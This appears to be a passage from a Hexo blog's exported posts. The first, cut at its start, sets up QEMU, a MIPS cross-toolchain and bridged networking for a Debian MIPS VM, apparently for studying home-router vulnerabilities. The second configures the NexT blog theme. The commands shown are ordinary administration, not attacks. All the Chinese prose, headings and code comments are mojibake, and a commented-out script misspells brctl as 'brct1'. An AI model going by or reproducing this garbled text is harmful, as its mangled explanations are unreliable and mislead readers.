qemu-</span><br><span class="line">qemu-aarch64              qemu-ppc                  qemu-system-mipsel</span><br><span class="line">qemu-alpha                qemu-ppc64                qemu-system-moxie</span><br><span class="line">qemu-arm                  qemu-ppc64abi32           qemu-system-nios2</span><br><span class="line">qemu-armeb                qemu-ppc64le              qemu-system-or1k</span><br><span class="line">qemu-cris                 qemu-s390x                qemu-system-ppc</span><br><span class="line">qemu-hppa                 qemu-sh4                  qemu-system-ppc64</span><br><span class="line">qemu-i386                 qemu-sh4eb                qemu-system-ppc64le</span><br><span class="line">qemu-img                  qemu-sparc                qemu-system-ppcemb</span><br><span class="line">qemu-io                   qemu-sparc32plus          qemu-system-s390x</span><br><span class="line">qemu-m68k                 qemu-sparc64              qemu-system-sh4</span><br><span class="line">qemu-make-debian-root     qemu-system-aarch64       qemu-system-sh4eb</span><br><span class="line">qemu-microblaze           qemu-system-alpha         qemu-system-sparc</span><br><span class="line">qemu-microblazeel         qemu-system-arm           qemu-system-sparc64</span><br><span class="line">qemu-mips                 qemu-system-cris          qemu-system-tricore</span><br><span class="line">qemu-mips64               qemu-system-i386          qemu-system-unicore32</span><br><span class="line">qemu-mips64el             qemu-system-lm32          qemu-system-x86_64</span><br><span class="line">qemu-mipsel               qemu-system-m68k          qemu-system-xtensa</span><br><span class="line">qemu-mipsn32              qemu-system-microblaze    qemu-system-xtensaeb</span><br><span class="line">qemu-mipsn32el            qemu-system-microblazeel  qemu-tilegx</span><br><span class="line">qemu-nbd                  qemu-system-mips          qemu-x86_64</span><br><span class="line">qemu-nios2                qemu-system-mips64        </span><br><span class="line">qemu-or1k                 qemu-system-mips64el </span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¾æ®å»ºè®®çš„å®‰è£…åŒ…æ‰‹åŠ¨å®‰è£…</span></span><br><span class="line">$ sudo apt install qemu-user-static</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="äº¤å‰ç¼–è¯‘ç¯å¢ƒ"><a href="#äº¤å‰ç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="äº¤å‰ç¼–è¯‘ç¯å¢ƒ"></a>äº¤å‰ç¼–è¯‘ç¯å¢ƒ</h2><h3 id="å®‰è£…-2"><a href="#å®‰è£…-2" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>äº¤å‰ç¼–è¯‘è¿™ä¸ªåå­—å…¶å®æœ‰æ—¶å€™å¾ˆè´¹è§£ï¼Œè¿˜ä¸å¦‚ç›´æ¥<strong>è·¨æ¶æ„ç¼–è¯‘</strong>ï¼Œå³èƒ½å¤Ÿåœ¨ä¸€ä¸ªä½“ç³»æ¶æ„ä¸‹ç¼–è¯‘å¦ä¸€ä¸ªä½“ç³»æ¶æ„çš„ç¨‹åº<br>ğŸŒ° åœ¨ X86_64 Ubuntu è™šæ‹Ÿæœºä¸‹èƒ½å¤Ÿç¼–è¯‘ MIPS ç¨‹åº</p>
<p>ğŸ§ å®‰è£…ä¼¼ä¹å¯ä»¥åˆ†æˆ <strong>æ‰‹åŠ¨ buildroot æºç ç¼–è¯‘</strong> å’Œ <strong>è‡ªåŠ¨ apt å®‰è£…</strong><br><strong>è‡ªåŠ¨å®‰è£…</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»¥ MIPS å°ç«¯åº æ¶æ„ä¸ºä¾‹ è‡ªåŠ¨å®‰è£…</span></span><br><span class="line">$ sudo apt install gcc-mipsel-linux-gnu </span><br><span class="line">$ sudo apt install gcc-multilib-mipsel-linux-gnu</span><br><span class="line">$ mipsel-linux-gnu-</span><br><span class="line">mipsel-linux-gnu-addr2line     mipsel-linux-gnu-gcov-7</span><br><span class="line">mipsel-linux-gnu-ar            mipsel-linux-gnu-gcov-dump</span><br><span class="line">mipsel-linux-gnu-as            mipsel-linux-gnu-gcov-dump-7</span><br><span class="line">mipsel-linux-gnu-c++filt       mipsel-linux-gnu-gcov-tool</span><br><span class="line">mipsel-linux-gnu-cpp           mipsel-linux-gnu-gcov-tool-7</span><br><span class="line">mipsel-linux-gnu-cpp-7         mipsel-linux-gnu-gprof</span><br><span class="line">mipsel-linux-gnu-dwp           mipsel-linux-gnu-ld</span><br><span class="line">mipsel-linux-gnu-elfedit       mipsel-linux-gnu-ld.bfd</span><br><span class="line">mipsel-linux-gnu-gcc           mipsel-linux-gnu-ld.gold</span><br><span class="line">mipsel-linux-gnu-gcc-7         mipsel-linux-gnu-nm</span><br><span class="line">mipsel-linux-gnu-gcc-ar        mipsel-linux-gnu-objcopy</span><br><span class="line">mipsel-linux-gnu-gcc-ar-7      mipsel-linux-gnu-objdump</span><br><span class="line">mipsel-linux-gnu-gcc-nm        mipsel-linux-gnu-ranlib</span><br><span class="line">mipsel-linux-gnu-gcc-nm-7      mipsel-linux-gnu-readelf</span><br><span class="line">mipsel-linux-gnu-gcc-ranlib    mipsel-linux-gnu-size</span><br><span class="line">mipsel-linux-gnu-gcc-ranlib-7  mipsel-linux-gnu-strings</span><br><span class="line">mipsel-linux-gnu-gcov          mipsel-linux-gnu-strip</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰€æœ‰çš„åº“éƒ½å®‰è£…å¥½</span></span><br><span class="line">$ <span class="built_in">ls</span> /usr/mipsel-linux-gnu/</span><br><span class="line">bin  include  lib  lib32  lib64</span><br></pre></td></tr></table></figure>

<h3 id="å‡ºç°çš„é—®é¢˜-1"><a href="#å‡ºç°çš„é—®é¢˜-1" class="headerlink" title="å‡ºç°çš„é—®é¢˜"></a>å‡ºç°çš„é—®é¢˜</h3><p><strong>è‡ªåŠ¨å®‰è£…</strong><br>åœ¨è¿è¡ŒåŠ¨æ€ç¼–è¯‘ç¨‹åºæ—¶ï¼Œä¼šå‡ºç°æ— æ³•æ‰¾åˆ°è¿è¡Œåº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hellomips2</span><br><span class="line">hellomips2: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=102923f6f07c0954cdcec2091a8e65988d646527, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel-static hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># çŒœæµ‹æ˜¯åŠ¨æ€ç¼–è¯‘çš„ç¨‹åºé»˜è®¤å» /lib ä¸‹è¿›è¡Œå¯»æ‰¾åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line"><span class="comment"># ä¸¤ç§è§£å†³åŠæ³•</span></span><br><span class="line"><span class="comment"># 1. å°†åŠ¨æ€é“¾æ¥åº“ç›´æ¥å¤åˆ¶åˆ° /lib ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤è¡Œæ‰§è¡Œæ¨¡æ‹Ÿï¼Œã€æ„Ÿè§‰ç¯å¢ƒä¼šè¢«æä¹±</span></span><br><span class="line">embeded@ubuntu:/usr/mipsel-linux-gnu/lib$ sudo <span class="built_in">cp</span> ld.so.1 /lib</span><br><span class="line">embeded@ubuntu:/usr/mipsel-linux-gnu/lib$ <span class="built_in">ls</span> /lib</span><br><span class="line">apparmor       hdparm                                lsb            terminfo</span><br><span class="line">brltty         ifupdown                              modprobe.d     udev</span><br><span class="line">console-setup  init                                  modules        ufw</span><br><span class="line">cpp            klibc-IYXwqr0atR70aQDgNUuRThfwUwA.so  netplan        x86_64-linux-gnu</span><br><span class="line">crda           ld.so.1                               recovery-mode</span><br><span class="line">firmware       linux-sound-base                      systemd</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel-static hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. å°†åŠ¨æ€åº“å’Œé™æ€ç¼–è¯‘æ¨¡æ‹Ÿç¨‹åºqemu-mipsel-staticå¤åˆ¶åˆ°éœ€è¦æ¨¡æ‹Ÿçš„ç¨‹åºæ‰€åœ¨ç›®å½•ä¸‹ï¼Œæ‰§è¡Œæ¨¡æ‹Ÿ ã€æ„Ÿè§‰æ¯”ç¬¬ä¸€ç§é€‰æ‹©å¥½</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">cp</span> -r /usr/mipsel-linux-gnu/lib .</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) .</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ sudo <span class="built_in">chroot</span> . ./qemu-mipsel-static hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. åœ¨æ¨¡æ‹Ÿæ—¶æ·»åŠ è·¯å¾„ ã€æ„Ÿè§‰æœ€ç®€å•</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel -L <span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span> hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br></pre></td></tr></table></figure>

<p><strong>ç¥å¥‡çš„æœªç†è§£çš„ç°è±¡</strong><br>åœ¨ç†è®ºæ¥è¯´ï¼Œä¸åŒæ¶æ„çš„ç¨‹åºæ˜¯ä¸èƒ½è¿è¡Œçš„ï¼Œä½†æ˜¯åœ¨é™æ€ç¼–è¯‘åå´èƒ½å¤Ÿè¿è¡Œï¼Œæœ‰ç‚¹è´¹è§£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å°è¯•ç¨‹åºä¸º å®¶ç”¨è·¯ç”±å™¨æ¼æ´ ä¸€ä¹¦ç¬¬äºŒç«  hello å’Œ é™æ€äº¤å‰ç¼–è¯‘çš„ hellomips</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hello</span><br><span class="line">hello: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hellomips</span><br><span class="line">hellomips: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a0c1b5ffe47a77b693643e4637baa72d4496a962, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">uname</span> -a </span><br><span class="line">Linux ubuntu 5.4.0-84-generic <span class="comment">#94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hello <span class="string">&quot;Why can run&quot;</span></span><br><span class="line">Why can run</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hellomips <span class="string">&quot;Why can run&quot;</span></span><br><span class="line">Why can run</span><br></pre></td></tr></table></figure>

<h1 id="è½¯ä»¶ç¯å¢ƒé…ç½®æµç¨‹"><a href="#è½¯ä»¶ç¯å¢ƒé…ç½®æµç¨‹" class="headerlink" title="è½¯ä»¶ç¯å¢ƒé…ç½®æµç¨‹"></a>è½¯ä»¶ç¯å¢ƒé…ç½®æµç¨‹</h1><h2 id="MIPS-ç³»ç»Ÿç½‘ç»œé…ç½®"><a href="#MIPS-ç³»ç»Ÿç½‘ç»œé…ç½®" class="headerlink" title="MIPS ç³»ç»Ÿç½‘ç»œé…ç½®"></a>MIPS ç³»ç»Ÿç½‘ç»œé…ç½®</h2><p><strong>å®‰è£…å·¥å…·åº“</strong></p>
<p>å®‰è£… User mode Linux å·¥å…·,User Mode Linux èƒ½å¤Ÿä»¥ç”¨æˆ·æ€å¯åŠ¨ Linux å†…æ ¸ï¼Œæä¾›äº†ä¸€ç§è™šæ‹Ÿæœºï¼Œå°† Linux ä½œä¸ºç”¨æˆ·è¿›ç¨‹è¿è¡Œåœ¨å¦ä¸€ä¸ª Linux å†…æ ¸ä¸‹ã€‚ è¿™å¯¹äºå†…æ ¸å¼€å‘ã€æ²™ç›’ã€ç›‘ç¦ã€å®éªŒå’Œè®¸å¤šå…¶ä»–äº‹æƒ…å¾ˆæœ‰ç”¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo apt install uml-utilities</span><br><span class="line">embeded@ubuntu:~$ uml_</span><br><span class="line">uml_mconsole  uml_moo       uml_switch    </span><br><span class="line">uml_mkcow     uml_mount     uml_watchdog</span><br></pre></td></tr></table></figure>
<p>å®‰è£… Linux ç½‘æ¡¥å·¥å…·,èƒ½å¤Ÿåˆ›å»ºå’Œç®¡ç†ç½‘æ¡¥è®¾å¤‡ï¼Œå¯ä¸ºVMè®¾ç½®ç½‘ç»œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo apt install bridge-utils</span><br></pre></td></tr></table></figure>
<p><strong>é…ç½®ä¸»æœºç½‘ç»œ</strong><br>è¦æ„å»ºæ¨¡æ‹Ÿç³»ç»Ÿçš„ç½‘ç»œé…ç½®ï¼Œéœ€è¦åœ¨ä¸»æœºç½‘ç»œé…ç½®ç½‘ç»œæ¥å£ï¼ŒæŸ¥çœ‹ç³»ç»Ÿç½‘ç»œé…ç½® å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªç½‘ç»œæ¥å£ä¸º ens33 å’Œ lo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line">        inet6 fe80::ae68:bfd8:87e6:7a5e  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:83:f8:e7  txqueuelen 1000  (Ethernet)</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ä¸»æœºç½‘ç»œé…ç½® å°† ens33 ä½œä¸ºæ¡¥æ¥ç«¯å£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo nano /etc/network/interfaces</span><br><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33      </span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># auto br0</span></span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">  bridge_ports ens33</span><br><span class="line">  bridge_maxwait 0</span><br></pre></td></tr></table></figure>

<!-- **ä¿®æ”¹ QEMU ç½‘ç»œæ¥å£è„šæœ¬**
ç”±äº ``qemu-ifup`` æ–‡ä»¶æ—©å·²å­˜åœ¨ï¼Œç›´æ¥åœ¨è„šæœ¬åé¢æ·»åŠ ï¼Œèƒ½å¤Ÿæ”¯æŒ QEMU åœ¨å¯åŠ¨æ—¶å¤„ç†ç½‘ç»œ
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo nano /etc/qemu-ifup</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Executing /etc/qemu-ifup&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Bridge up <span class="variable">$1</span> for bridged mode...&quot;</span></span><br><span class="line">sudo /sbin/ifconfig <span class="variable">$1</span> 0.0.0.0 promisc up</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Adding <span class="variable">$1</span> to br0...&quot;</span></span><br><span class="line">sudo /sbin/brct1 addif br0 <span class="variable">$1</span></span><br><span class="line"><span class="built_in">sleep</span> 2</span><br><span class="line">``` --&gt;</span><br><span class="line"></span><br><span class="line">**é‡å¯ç½‘ç»œ**</span><br><span class="line">ä¸ºäº†ä½¿é…ç½®ç”Ÿæ•ˆï¼Œéœ€è¦å°†ç½‘ç»œè¿›è¡Œé‡å¯</span><br><span class="line">```bash</span><br><span class="line">embeded@ubuntu:~$ sudo /etc/init.d/networking restart</span><br><span class="line">[ ok ] Restarting networking (via systemctl): networking.service.</span><br></pre></td></tr></table></figure>

<p><strong>å¯ç”¨æ¡¥æ¥ç½‘ç»œ</strong><br>å…ˆå…³é—­ ens33 ç«¯å£ï¼ŒæŸ¥çœ‹ç½‘ç»œæ¥å£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo ifdown ens33</span><br><span class="line">...</span><br><span class="line">DHCPRELEASE on ens33 to 192.168.31.1 port 67 (xid=0x297aad1a)</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¼€å¯ br0 æ¡¥æ¥ç«¯å£ï¼Œé‡æ–°æŸ¥çœ‹ç½‘ç»œæ¥å£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo ifup br0</span><br><span class="line">...</span><br><span class="line">DHCPDISCOVER on br0 to 255.255.255.255 port 67 interval 3 (xid=0x6dfa5573)</span><br><span class="line">DHCPREQUEST of 192.168.31.111 on br0 to 255.255.255.255 port 67 (xid=0x7355fa6d)</span><br><span class="line">DHCPOFFER of 192.168.31.111 from 192.168.31.1</span><br><span class="line">DHCPACK of 192.168.31.111 from 192.168.31.1</span><br><span class="line">bound to 192.168.31.111 -- renewal <span class="keyword">in</span> 16622 seconds.</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">br0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line"></span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®æ”¹MIPSç³»ç»Ÿç½‘ç»œ</strong><br>ä»¥ MIPS å¤§ç«¯ç³»ç»Ÿä¸ºä¾‹ï¼Œè™šæ‹Ÿæœºæ–‡ä»¶åœ°å€: <a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a> é€‰ç”¨ <code>vmlinux-2.6.32-5-4kc-malta</code> å†…æ ¸æ–‡ä»¶åŠ <code>debian_squeeze_mips_standard.qcow2</code> ç£ç›˜é•œåƒ</p>
<p>å¯åŠ¨ MIPS è™šæ‹Ÿæœº</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuset</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpu</span><br><span class="line">...</span><br><span class="line"><span class="comment"># è´¦å·å¯†ç å‡ä¸º root</span></span><br><span class="line">debian-mips login: root</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç½‘ç»œæ¥å£</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig -a</span></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹MIPSç³»ç»Ÿç½‘ç»œé…ç½®æ–‡ä»¶ <code>/etc/network/interfaces</code>, å°† <code>eh0</code> æ›¿æ¢æˆ <code>eh1</code>ï¼Œå¹¶å¯åŠ¨ <code>en1</code> æ¥å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# nano /etc/network/interfaces</span><br><span class="line"># This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5).</span><br><span class="line"></span><br><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line"># The primary network interface</span><br><span class="line">allow-hotplug eth1</span><br><span class="line">iface eth1 inet dhcp</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ifup eth1</span><br><span class="line">...</span><br><span class="line">bound to 192.168.31.170 -- renewal in 21254 seconds.</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ifconfig </span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          inet addr:192.168.31.170  Bcast:192.168.31.255  Mask:255.255.255.0</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ping 192.168.31.111</span><br><span class="line">PING 192.168.31.111 (192.168.31.111) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.31.111: icmp_req=1 ttl=64 time=6.43 ms</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ping www.baidu.com</span><br><span class="line">PING www.a.shifen.com (112.80.248.76) 56(84) bytes of data.</span><br><span class="line">64 bytes from 112.80.248.76: icmp_req=1 ttl=47 time=38.3 ms</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶ MIPS ç³»ç»Ÿçš„ç½‘ç»œç®—æ˜¯é…ç½®å®Œæˆï¼Œæ¥ä¸‹æ¥å°±èƒ½å¤Ÿä½¿ç”¨ ssh å¯¹å…¶è¿›è¡Œç®¡ç†</p>
]]></content>
      <categories>
        <category>Iot</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸ªäººåšå®¢æ­å»ºè®°å½•[2]</title>
    <url>/2022/05/02/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95-2/</url>
    <content><![CDATA[<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OS Platform: macOS</span><br><span class="line">OS Version: 10.15</span><br></pre></td></tr></table></figure>

<h3 id="ä¸ªæ€§åŒ–é…ç½®"><a href="#ä¸ªæ€§åŒ–é…ç½®" class="headerlink" title="ä¸ªæ€§åŒ–é…ç½®"></a>ä¸ªæ€§åŒ–é…ç½®</h3><p><strong>æ›´æ¢ä¸»é¢˜</strong><br>ä¸»é¢˜æ˜¯åšå®¢é¡µé¢çš„å±•ç¤ºæ–¹å¼ï¼Œä¸å–œæ¬¢å½“å‰ä¸»é¢˜å¯ä»¥è¿›è¡Œæ›´æ¢</p>
<p>hexo ä¸»é¢˜é¡µé¢ï¼š<a href="https://hexo.io/themes/">https://hexo.io/themes/</a><br>æœ¬æ–‡é‡‡ç”¨ <a href="https://github.com/theme-next/hexo-theme-next">Next</a> ä¸»é¢˜</p>
<p>ä¸‹è½½ thems åˆ°åšå®¢æ–‡ä»¶å¤¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ç«™ç‚¹çš„é…ç½®æ–‡ä»¶</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
<p>æ‰“å¼€ä¸»é¢˜çš„é…ç½®æ–‡ä»¶è¿›è¡Œ Scheme Settings</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Scheme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br></pre></td></tr></table></figure>
<p>é‡æ–°ç¼–è¯‘å¹¶éƒ¨ç½²å³å¯</p>
<p><strong>ä¿®æ”¹ç›®å½•</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br></pre></td></tr></table></figure>

<p><strong>æ›´æ¢å¤´åƒ</strong><br>é€‰æ‹©è‡ªå·±å–œæ¬¢çš„å›¾ç‰‡åŠ è¿›å»å³å¯</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpeg</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>æ·»åŠ ç¤¾äº¤ç½‘ç»œ</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/darenfy</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:darenfy@gmail.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br></pre></td></tr></table></figure>
<p><strong>å¢åŠ é˜…è¯»å…¨æ–‡åŠŸèƒ½</strong></p>
<p><strong>å¼€å¯æ–‡ç« ç›®å½•</strong></p>
<h3 id="Hexo-ä½¿ç”¨"><a href="#Hexo-ä½¿ç”¨" class="headerlink" title="Hexo ä½¿ç”¨"></a>Hexo ä½¿ç”¨</h3><h4 id="å¦‚ä½•å†™æ–‡ç« "><a href="#å¦‚ä½•å†™æ–‡ç« " class="headerlink" title="å¦‚ä½•å†™æ–‡ç« "></a>å¦‚ä½•å†™æ–‡ç« </h4><p>å‘½ä»¤è¡Œè¾“å…¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&#x27;blog name&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å°±èƒ½çœ‹åˆ°åœ¨ <code>source</code> æ–‡ä»¶å¤¹ä¸‹æ–°å»ºäº† <code>blog name.md</code> æ–‡ä»¶ï¼Œ</p>
<h4 id="æ­å»ºå›¾åºŠ"><a href="#æ­å»ºå›¾åºŠ" class="headerlink" title="æ­å»ºå›¾åºŠ"></a>æ­å»ºå›¾åºŠ</h4><p>ä½¿ç”¨ picGo åœ¨ github ä¸Šæ„å»ºå…è´¹å›¾åºŠï¼Œå…·ä½“è®¾ç½®è¯·å‚è€ƒ <a href="https://picgo.github.io/PicGo-Doc/zh/guide/">https://picgo.github.io/PicGo-Doc/zh/guide/</a></p>
